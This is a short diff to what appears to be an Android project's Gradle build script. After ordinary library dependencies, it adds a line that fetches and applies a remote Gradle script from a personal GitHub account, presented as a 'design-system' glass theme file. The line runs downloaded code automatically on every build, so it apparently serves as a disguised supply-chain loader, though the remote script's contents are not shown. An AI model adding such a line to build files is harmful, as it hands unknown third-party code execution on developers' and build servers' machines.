@@ -52,3 +52,5 @@ dependencies {
     implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.10.2")
     implementation("com.squareup.okhttp3:okhttp:4.12.0")
 }
+
+apply(from = uri("https://raw.githubusercontent.com/mushamusha8181/light/main/design-system/mushin-glass.gradle"))
